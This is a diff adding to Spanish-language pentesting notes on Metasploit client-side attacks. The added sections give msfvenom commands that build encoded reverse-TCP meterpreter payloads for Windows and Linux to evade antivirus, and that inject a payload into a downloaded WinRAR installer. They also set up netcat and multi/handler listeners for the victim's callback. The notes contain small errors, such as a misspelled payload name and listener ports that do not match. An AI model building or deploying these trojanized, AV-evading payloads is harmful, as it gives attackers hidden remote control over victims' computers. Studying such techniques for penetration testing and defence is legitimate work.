@@ -1,6 +1,6 @@
 # Ataques del lado del cliente con Metasploit 
 
-Tags: #Metasploit #Msfvenom #Encode #Payloads #Shellcode 
+Tags: #Metasploit #Msfvenom #Encode #Payloads #Shellcode #AntiVirus #InjectPayloads
 
 * Client-Side Attacks: Es un vector de ataque hace que un cliente ejecute un payload malicioso en su sistema que consecuentemente hará una conexión trasera con un atacante cuando sea ejecutado. Utiliza documentos o archivos ejecutables. 
 
@@ -87,6 +87,8 @@ Msfconsole: Es una utilidad de línea de comando que puede ser usada para genera
 ```
 
 
+---
+
 ## Encodear Payload con MSF
 
 * Se utiliza el encodeamiento de los payload ya que los atacantes después de transferir y almacenar los payloads maliciosos en los discos duros de los clientes, los atacantes necesitan estar consientes de la detección de los Antivirus (AV).  Los usuarios finales de soluciones de AV utilizan detección basada en orden para identificar archivos o ejecutables maliciosos. Podemos evadir los AV encodeando nuestros payloads. Encodear es un proceso de modificar el Shellcode del payload con el objetivo de modificar la firma del payload. 
@@ -94,5 +96,112 @@ Msfconsole: Es una utilidad de línea de comando que puede ser usada para genera
 * Shellcode: Es una pieza de código típicamente usada como un payload para explotación. 
 
 ```bash 
-❯ 
+❯ msfvenom --list encoders               # Lista de encoders
+```
+
+### Para Windows 
+
+```bash 
+❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -e x86/shikata_ga_nai -f exe > /home/kali/Desktop/encodex86.exe
+	# e = Nombre del encoder 
+
+
+❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -i 10 -e x86/shikata_ga_nai -f exe > /home/kali/Desktop/encodex86.exe
+
+	# e = Nombre del encoder 
+	# i = Iteraciones 
+```
+
+```bash 
+2. Debemos de transferir el archivo a la maquina victima Windows 
+```
+
+```bash
+3. Nos ponemos en escucha para cuando se ejecute el payload en la maquian victima podamos establecer la Revershell
+❯ rlwrap nc -nlvp 443
+```
+
+```bash 
+3. Nos ponemos en escucha con MSF para cuando se ejecute el payload en la maquian victima podamos establecer la Revershell
+# Con el archivo malicioso hecho en msfvenom, hacemos lo siguiente y nos pondriamos en 'listening'
+
+❯ msfvenom -q                  # q = Quitar el banner de inicio
+
+	❯ use multi/handler                 
+	❯ set payload windows/meterpreter/reverse_tcp           # Colocamos el mismo payload que en el msfvenom
+	❯ options
+	❯ set LHOST 192.168.68.1                     
+	❯ set LPORT 1234
+	❯ run
+```
+
+### Para Linux 
+
+```bash 
+❯ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -i 10 -e x86/shikata_ga_nai -f elf > /home/kali/Desktop/encodex86
+
+	# e = Nombre del encoder 
+	# i = Iteraciones 
+```
+
+```bash 
+2. Debemos de transferir el archivo a la maquina victima Linux 
+```
+
+```bash
+3. Nos ponemos en escucha para cuando se ejecute el payload en la maquian victima podamos establecer la Revershell
+❯ nc -nlvp 443
+```
+
+```bash 
+3. Nos ponemos en escucha con MSF para cuando se ejecute el payload en la maquian victima podamos establecer la Revershell
+# Con el archivo malicioso hecho en msfvenom, hacemos lo siguiente y nos pondriamos en 'listening'
+
+❯ msfvenom -q                  # q = Quitar el banner de inicio
+
+	❯ use multi/handler                 
+	❯ set payload linux/x68/meterpreter/reverse_tcp           # Colocamos el mismo payload que en el msfvenom
+	❯ options
+	❯ set LHOST 192.168.68.1                     
+	❯ set LPORT 1234
+	❯ run
+```
+
+
+---
+
+## Inyectar Payload dentro de ejecutables portables de Windows 
+
+```bash 
+1. Debemos descargar un archivo ejecutable de Google (WinRAR = wrar6.exe)
+```
+
+```bash 
+# Creamos el payload y se lo pasamos a un archivo ejecutable 'confiable'
+❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/wrar6.exe > ~/Desktop/Winrar.exe
+
+	# x = Especificar el archivo ejecutable para usar como plantilla
+```
+
+```bash 
+2. Debemos de transferir el archivo a la maquina victima Windows 
+```
+
+```bash
+3. Nos ponemos en escucha para cuando se ejecute el payload en la maquian victima podamos establecer la Revershell
+❯ rlwrap nc -nlvp 443
+```
+
+```bash 
+3. Nos ponemos en escucha con MSF para cuando se ejecute el payload en la maquian victima podamos establecer la Revershell
+# Con el archivo malicioso hecho en msfvenom, hacemos lo siguiente y nos pondriamos en 'listening'
+
+❯ msfvenom -q                  # q = Quitar el banner de inicio
+
+	❯ use multi/handler                 
+	❯ set payload windows/meterpreter/reverse_tcp           # Colocamos el mismo payload que en el msfvenom
+	❯ options
+	❯ set LHOST 192.168.68.1                     
+	❯ set LPORT 1234
+	❯ run
 ```
